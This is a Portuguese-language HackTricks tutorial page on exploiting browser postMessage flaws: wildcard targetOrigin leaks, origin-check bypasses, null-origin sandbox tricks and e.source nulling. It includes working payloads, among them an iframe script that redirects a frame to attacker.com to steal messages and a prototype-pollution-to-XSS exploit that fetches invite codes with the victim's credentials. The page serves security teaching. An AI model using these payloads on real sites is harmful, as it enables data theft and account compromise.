# PostMessage Vulnerabilities

## PostMessage Vulnerabilities

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}


## Enviar **PostMessage**

**PostMessage** usa a seguinte fun√ß√£o para enviar uma mensagem:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Note que **targetOrigin** pode ser um '\*' ou uma URL como _https://company.com._\
No **segundo cen√°rio**, a **mensagem s√≥ pode ser enviada para aquele dom√≠nio** (mesmo que a origem do objeto window seja diferente).\
Se o **curinga** for usado, **as mensagens podem ser enviadas para qualquer dom√≠nio**, e ser√£o enviadas para a origem do objeto Window.

### Atacando iframe & curinga em **targetOrigin**

Como explicado em [**este relat√≥rio**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), se voc√™ encontrar uma p√°gina que pode ser **iframed** (sem prote√ß√£o `X-Frame-Header`) e que est√° **enviando mensagens sens√≠veis** via **postMessage** usando um **curinga** (\*), voc√™ pode **modificar** a **origem** do **iframe** e **vazar** a **mensagem sens√≠vel** para um dom√≠nio controlado por voc√™.\
Note que se a p√°gina pode ser iframed, mas o **targetOrigin** est√° **definido para uma URL e n√£o para um curinga**, esse **truque n√£o funcionar√°**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## explora√ß√£o do addEventListener

**`addEventListener`** √© a fun√ß√£o usada pelo JS para declarar a fun√ß√£o que est√° **esperando `postMessages`**.\
Um c√≥digo semelhante ao seguinte ser√° usado:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
Note que neste caso, a **primeira coisa** que o c√≥digo faz √© **verificar a origem**. Isso √© terrivelmente **importante**, principalmente se a p√°gina for fazer **algo sens√≠vel** com as informa√ß√µes recebidas (como mudar uma senha). **Se n√£o verificar a origem, atacantes podem fazer com que as v√≠timas enviem dados arbitr√°rios para esses endpoints** e mudem as senhas das v√≠timas (neste exemplo).

### Enumera√ß√£o

Para **encontrar ouvintes de eventos** na p√°gina atual, voc√™ pode:

* **Pesquisar** o c√≥digo JS por `window.addEventListener` e `$(window).on` (_vers√£o JQuery_)
* **Executar** no console das ferramentas de desenvolvedor: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1).png>)

* **Ir para** _Elements --> Event Listeners_ nas ferramentas de desenvolvedor do navegador

![](<../../.gitbook/assets/image (396).png>)

* Usar uma **extens√£o de navegador** como [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ou [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Essas extens√µes de navegador ir√£o **interceptar todas as mensagens** e mostr√°-las para voc√™.

### Bypass de verifica√ß√£o de origem

* O atributo **`event.isTrusted`** √© considerado seguro, pois retorna `True` apenas para eventos gerados por a√ß√µes genu√≠nas do usu√°rio. Embora seja desafiador contornar se implementado corretamente, sua import√¢ncia nas verifica√ß√µes de seguran√ßa √© not√°vel.
* O uso de **`indexOf()`** para valida√ß√£o de origem em eventos PostMessage pode ser suscet√≠vel a contornos. Um exemplo que ilustra essa vulnerabilidade √©:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
* O m√©todo **`search()`** de `String.prototype.search()` √© destinado a express√µes regulares, n√£o a strings. Passar qualquer coisa que n√£o seja uma regexp leva a uma convers√£o impl√≠cita para regex, tornando o m√©todo potencialmente inseguro. Isso ocorre porque em regex, um ponto (.) atua como um curinga, permitindo contornar a valida√ß√£o com dom√≠nios especialmente elaborados. Por exemplo:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
* A fun√ß√£o **`match()`**, semelhante a `search()`, processa regex. Se a regex estiver mal estruturada, pode ser suscet√≠vel a contornos.
* A fun√ß√£o **`escapeHtml`** √© destinada a sanitizar entradas escapando caracteres. No entanto, ela n√£o cria um novo objeto escapado, mas sobrescreve as propriedades do objeto existente. Esse comportamento pode ser explorado. Particularmente, se um objeto puder ser manipulado de tal forma que sua propriedade controlada n√£o reconhe√ßa `hasOwnProperty`, o `escapeHtml` n√£o funcionar√° como esperado. Isso √© demonstrado nos exemplos abaixo:

* Falha Esperada:

```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```
* Contornando a escapada:

```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

No contexto dessa vulnerabilidade, o objeto `File` √© notavelmente explor√°vel devido √† sua propriedade `name` somente leitura. Essa propriedade, quando usada em templates, n√£o √© sanitizada pela fun√ß√£o `escapeHtml`, levando a potenciais riscos de seguran√ßa.
* A propriedade `document.domain` em JavaScript pode ser definida por um script para encurtar o dom√≠nio, permitindo uma aplica√ß√£o mais relaxada da pol√≠tica de mesma origem dentro do mesmo dom√≠nio pai.

### e.origin == window.origin bypass

Ao incorporar uma p√°gina da web dentro de um **iframe sandboxed** usando %%%%%%, √© crucial entender que a origem do iframe ser√° definida como nula. Isso √© particularmente importante ao lidar com **atributos de sandbox** e suas implica√ß√µes na seguran√ßa e funcionalidade.

Ao especificar **`allow-popups`** no atributo sandbox, qualquer janela pop-up aberta de dentro do iframe herda as restri√ß√µes de sandbox de seu pai. Isso significa que, a menos que o atributo **`allow-popups-to-escape-sandbox`** tamb√©m seja inclu√≠do, a origem da janela pop-up √© igualmente definida como `null`, alinhando-se com a origem do iframe.

Consequentemente, quando uma pop-up √© aberta sob essas condi√ß√µes e uma mensagem √© enviada do iframe para a pop-up usando **`postMessage`**, ambas as extremidades de envio e recebimento t√™m suas origens definidas como `null`. Essa situa√ß√£o leva a um cen√°rio onde **`e.origin == window.origin`** avalia como verdadeiro (`null == null`), porque tanto o iframe quanto a pop-up compartilham o mesmo valor de origem `null`.

Para mais informa√ß√µes **leia**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Contornando e.source

√â poss√≠vel verificar se a mensagem veio da mesma janela em que o script est√° ouvindo (especialmente interessante para **Content Scripts de extens√µes de navegador** para verificar se a mensagem foi enviada da mesma p√°gina):
```javascript
// If it‚Äôs not, return immediately.
if( received_message.source !== window ) {
return;
}
```
Voc√™ pode for√ßar **`e.source`** de uma mensagem a ser nulo criando um **iframe** que **envia** o **postMessage** e √© **imediatamente deletado**.

Para mais informa√ß√µes **leia:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### Bypass do X-Frame-Header

Para realizar esses ataques, idealmente voc√™ poder√° **colocar a p√°gina da v√≠tima** dentro de um `iframe`. Mas alguns cabe√ßalhos como `X-Frame-Header` podem **prevenir** esse **comportamento**.\
Nesses cen√°rios, voc√™ ainda pode usar um ataque menos furtivo. Voc√™ pode abrir uma nova aba para a aplica√ß√£o web vulner√°vel e se comunicar com ela:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Roubo de mensagem enviada para o filho bloqueando a p√°gina principal

Na p√°gina a seguir, voc√™ pode ver como poderia roubar um **dado sens√≠vel de postmessage** enviado para um **iframe filho** ao **bloquear** a p√°gina **principal** antes de enviar os dados e abusar de um **XSS no filho** para **vazar os dados** antes que sejam recebidos:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Roubo de mensagem modificando a localiza√ß√£o do iframe

Se voc√™ puder iframe uma p√°gina da web sem X-Frame-Header que cont√©m outro iframe, voc√™ pode **mudar a localiza√ß√£o desse iframe filho**, ent√£o, se ele estiver recebendo um **postmessage** enviado usando um **wildcard**, um atacante poderia **mudar** a **origem** desse iframe para uma p√°gina **controlada** por ele e **roubar** a mensagem:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage para Polui√ß√£o de Prot√≥tipo e/ou XSS

Em cen√°rios onde os dados enviados atrav√©s de `postMessage` s√£o executados por JS, voc√™ pode **iframe** a **p√°gina** e **explorar** a **polui√ß√£o de prot√≥tipo/XSS** enviando o exploit via `postMessage`.

Um par de **XSS muito bem explicados atrav√©s de `postMessage`** pode ser encontrado em [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Exemplo de um exploit para abusar da **Polui√ß√£o de Prot√≥tipo e depois XSS** atrav√©s de um `postMessage` para um `iframe`:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
Para **mais informa√ß√µes**:

* Link para a p√°gina sobre [**polui√ß√£o de prot√≥tipo**](../deserialization/nodejs-proto-prototype-pollution/)
* Link para a p√°gina sobre [**XSS**](../xss-cross-site-scripting/)
* Link para a p√°gina sobre [**polui√ß√£o de prot√≥tipo do lado do cliente para XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Refer√™ncias

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Para praticar: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)


{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
